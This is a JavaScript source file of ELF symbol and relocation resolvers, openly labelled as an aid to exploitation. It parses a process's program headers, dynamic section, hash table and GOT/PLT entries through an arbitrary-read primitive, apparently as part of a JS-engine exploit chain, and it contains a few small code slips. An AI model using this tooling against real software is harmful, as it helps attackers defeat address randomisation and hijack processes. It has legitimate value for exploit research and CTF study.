// ELF resolver functions to aid in symbol resolution for exploitation

function ELF64_R_SYM(i) {
	return ((i) >> 32);
}

function ELF64_R_TYPE(i) {
	return ((i) & 0xffffffff);
}

let offsetof_e_phnum = 56n;
let offsetof_e_phoff = 32n;
let offsetof_p_type = 0n;
let offsetof_p_flags = 4n;
let offsetof_p_filesz = 32n;
let offsetof_p_offset = 8n;
let offsetof_p_vaddr = 16n;
let offsetof_d_tag = 0n;
let offsetof_d_un_d_val = 8n;
let offsetof_r_offset = 0n;
let offsetof_r_info = 8n;
let offsetof_st_name = 0n;
let offsetof_st_value = 8n;

let sizeof_Elf64_Phdr = 56n;
let sizeof_Elf64_Dyn = 16n;
let sizeof_Elf64_Rela = 24n;
let sizeof_Elf64_Sym = 24n;

let PT_LOAD = 1n;
let PT_DYNAMIC = 2n;

let PF_W = 2n;
let PF_X = 1n;

let DT_PLTGOT = 3n;
let DT_JMPREL = 23n;
let DT_PLTRELSZ = 2n;
let DT_SYMTAB = 6n;
let DT_STRTAB = 5n;
let DT_STRSZ = 10n;
let DT_RELAENT = 9n;
let DT_PLTREL = 20n;
let DT_RELA = 7n;
let DT_RELASZ = 8n;
let DT_HASH = 4n

let R_X86_64_JUMP_SLOT = 7n;
let R_X86_64_GLOB_DAT = 6n;

function arb_rstring(addr) {
	var str = "";

	while (true) {
		ch = Number(arb_read(addr, 1));
		if (ch == 0)
			return str;
		str += String.fromCharCode(ch);
		addr += 1n;
	}
}

function elf_hash(sym_name) {
	var h=0;
	var g;

	for (var i = 0; i < sym_name.length; i++) {
		char = Number(sym_name.charCodeAt(i))
        h = (h << 4) + char;
        g = h & 0xf0000000;
		if (g) {
			h ^= g >> 24;
		}
		h &= ~g;
	}
	return h;
}

function resolve_symbol(base_addr, sym_name) {
	var p_dyn, p_data, p_text;
	var e_phnum;
	var e_phoff;

	e_phnum = BigInt(arb_read(base_addr + offsetof_e_phnum, 2));
	e_phoff = BigInt(arb_read(base_addr + offsetof_e_phoff, 8));
	console.log("[+] Resolving symbols from ELF image at 0x"+base_addr.toString(16));

	for (var i = 0n; i < e_phnum; i++) {
		var offset =  BigInt(e_phoff + sizeof_Elf64_Phdr * i);
		var p_type = BigInt(arb_read(base_addr + offset + offsetof_p_type, 4));
		var p_flags = BigInt(arb_read(base_addr + offset + offsetof_p_flags, 4));

		if (p_type == PT_LOAD && (p_flags & PF_X)) {
			p_text = i;
		} else if (p_type == PT_LOAD && (p_flags & PF_W)) {
			p_data = i;
		} else if (p_type == PT_DYNAMIC) {
			p_dyn = i;
		}
	}
	
	var p_dyn_filesz = BigInt(arb_read(base_addr + e_phoff + sizeof_Elf64_Phdr * p_dyn + offsetof_p_filesz, 8));
	var p_dyn_vaddr = BigInt(arb_read(base_addr + e_phoff + sizeof_Elf64_Phdr * p_dyn + offsetof_p_vaddr, 8));

	var strtab, symtab;

	for (var i = 0n; i < p_dyn_filesz/sizeof_Elf64_Dyn; i++) {
		var offset =  BigInt(p_dyn_vaddr + sizeof_Elf64_Dyn * i);
		var d_tag = BigInt(arb_read(base_addr + offset + offsetof_d_tag, 8));
		var d_val = BigInt(arb_read(base_addr + offset + offsetof_d_un_d_val, 8));

		switch (d_tag) {
		case DT_SYMTAB:
			symtab = d_val;
			break;
		case DT_STRTAB:
			strtab = d_val;
			break;
		}
	}
	
	function lookup(sym_name, symtab, strtab) {
		var idx = 0n;
		var sym_offset;
		var st_name;
		var sym_str;

		do {
			sym_offset = symtab + (idx * sizeof_Elf64_Sym);
			st_name = arb_read(sym_offset + offsetof_st_name, 4);
			sym_str = arb_rstring(strtab + st_name);
			idx++;
			
			if (sym_str && sym_name == sym_str) {
				return  base_addr + arb_read(sym_offset + offsetof_st_value, 4);
			}

		} while(true);
	}
	return lookup(sym_name, symtab, strtab);
}

function resolve_symbol_quick(base_addr, sym_name) {
	var p_dyn;
	var e_phnum;
	var e_phoff;

	e_phnum = BigInt(arb_read(base_addr + offsetof_e_phnum, 2));
	e_phoff = BigInt(arb_read(base_addr + offsetof_e_phoff, 8));

	for (var i = 0n; i < e_phnum; i++) {
		var offset =  BigInt(e_phoff + sizeof_Elf64_Phdr * i);
		var p_type = BigInt(arb_read(base_addr + offset + offsetof_p_type, 4));
		var p_flags = BigInt(arb_read(base_addr + offset + offsetof_p_flags, 4));

		if (p_type == PT_LOAD && (p_flags & PF_X)) {
			p_text = i;
		} else if (p_type == PT_LOAD && (p_flags & PF_W)) {
			p_data = i;
		} else if (p_type == PT_DYNAMIC) {
			p_dyn = i;
		}
	}
	
	var p_dyn_filesz = BigInt(arb_read(base_addr + e_phoff + sizeof_Elf64_Phdr * p_dyn + offsetof_p_filesz, 8));
	var p_dyn_vaddr = BigInt(arb_read(base_addr + e_phoff + sizeof_Elf64_Phdr * p_dyn + offsetof_p_vaddr, 8));
	var strtab, symtab, dthash;

	for (var i = 0n; i < p_dyn_filesz/sizeof_Elf64_Dyn; i++) {
		var offset =  BigInt(p_dyn_vaddr + sizeof_Elf64_Dyn * i);
		var d_tag = BigInt(arb_read(base_addr + offset + offsetof_d_tag, 8));
		var d_val = BigInt(arb_read(base_addr + offset + offsetof_d_un_d_val, 8));

		switch (d_tag) {
		case DT_SYMTAB:
			symtab = d_val;
			break;
		case DT_STRTAB:
			strtab = d_val;
			break;
		case DT_HASH:
			dthash = d_val;
		default:
			break;
		}
	}

	function lookup(name_hash, hashtab, symtab, strtab) {
		var nbuckets;
		var buckets;
		var chains;
		var h, idx;

		nbuckets = BigInt(arb_read(hashtab + (0n * 4n), 4));
		nchains = BigInt(arb_read(hashtab + (1n * 4n), 4));
		buckets = BigInt(hashtab + (2n* 4n));
		chains = BigInt(buckets + (nbuckets * 4n));
		h = BigInt(name_hash) % nbuckets;
		
		for (idx = arb_read(buckets + (h * 4n), 4); idx != 0n; idx = arb_read(chains + (idx * 4n), 4)) {
			sym_offset = symtab + (idx * sizeof_Elf64_Sym);
			st_name = arb_read(sym_offset + offsetof_st_name, 4);
			sym_str = arb_rstring(strtab + st_name);
			
			if (elf_hash(sym_str) == name_hash) {
				return base_addr + arb_read(sym_offset + offsetof_st_value, 4);
			}
		}
		return 0n;
	}
	sym_hash = elf_hash(sym_name);
	return lookup(sym_hash, dthash, symtab, strtab);
}

function resolve_relocs(base_addr, sym_type) {
	var symbols = new Array();
	var p_dyn, p_data, p_text;
	var e_phnum;
	var e_phoff;

	console.log("[+] Resolving relocs for image at 0x"+base_addr.toString(16));

	e_phnum = BigInt(arb_read(base_addr + offsetof_e_phnum, 2));
	e_phoff = BigInt(arb_read(base_addr + offsetof_e_phoff, 4));

	for (var i = 0n; i < e_phnum; i++) {
		var offset =  BigInt(e_phoff + sizeof_Elf64_Phdr * i);
		var p_type = BigInt(arb_read(base_addr + offset + offsetof_p_type, 4));
		var p_flags = BigInt(arb_read(base_addr + offset + offsetof_p_flags, 4));

		if (p_type == PT_LOAD && (p_flags & PF_X)) {
			p_text = i;
		} else if (p_type == PT_LOAD && (p_flags & PF_W)) {
			p_data = i;
		} else if (p_type == PT_DYNAMIC) {
			p_dyn = i;
		}
	}

	var p_dyn_filesz = BigInt(arb_read(base_addr + e_phoff + sizeof_Elf64_Phdr * p_dyn + offsetof_p_filesz, 8));
	var p_dyn_vaddr = BigInt(arb_read(base_addr + e_phoff + sizeof_Elf64_Phdr * p_dyn + offsetof_p_vaddr, 8));
	var jmprel, pltrelsz, relasz, strtab, symtab, relaent, strsz, pltgot, rel;

	for (var i = 0n; i < p_dyn_filesz/sizeof_Elf64_Dyn; i++) {
		var offset =  BigInt(p_dyn_vaddr + sizeof_Elf64_Dyn * i);
		var d_tag = BigInt(arb_read(base_addr + offset + offsetof_d_tag, 8));
		var d_val = BigInt(arb_read(base_addr + offset + offsetof_d_un_d_val, 8));

		switch (d_tag) {
		case DT_PLTGOT:
			pltgot = d_val;
			break;
		case DT_JMPREL:
			jmprel = d_val;
			break;
		case DT_PLTRELSZ:
			pltrelsz = d_val;
			break;
		case DT_SYMTAB:
			symtab = d_val;
			break;
		case DT_STRTAB:
			strtab = d_val;size
			break;
		case DT_STRSZ:
			strsz = d_val;
			break;
		case DT_RELAENT:
			relaent = d_val;
			break;
		case DT_RELA:
			rel = d_val;
			break;
		case DT_RELASZ:
			relasz = d_val;
			break;
		default:
			break;
		}
	}

	var centinel;
	var size;

	if (sym_type == R_X86_64_GLOB_DAT) {
		centinel = rel;
		size = relasz/relaent;
	} else {
		centinel = jmprel;
		size = pltrelsz/relaent;
	}

	for (var i = 0n; i < size; i++) {
		var offset =  BigInt(centinel + (sizeof_Elf64_Rela * i));
		var r_type = BigInt(arb_read(offset + offsetof_r_info + 0n, 4));
		var r_sym = BigInt(arb_read(offset + offsetof_r_info + 4n, 4));
		var sym_address, sym_name;

		if (r_type == sym_type) {
			var sym_offset =  BigInt(symtab + r_sym * sizeof_Elf64_Sym);
			if (sym_offset == 0n) {
				continue;
			}
			var st_name = BigInt(arb_read(sym_offset + offsetof_st_name, 4));
			if (st_name == 0n) {
				continue;
			}
			
			if (sym_type == R_X86_64_GLOB_DAT) {
				sym_address = base_addr + BigInt(arb_read(sym_offset + offsetof_st_value, 4));
			} else {
				sym_address = pltgot + (i + 3n) * 8n;
			}
			
			sym_name = arb_rstring(strtab + st_name);
			if (sym_name) {
				//console.log("\t\t["+i+"] "+r_type+" Symbol " + sym_name + ":\t0x"+ sym_address.toString(16));
				symbols[sym_name] = sym_address;
			}
		}
	}
	return symbols;
}

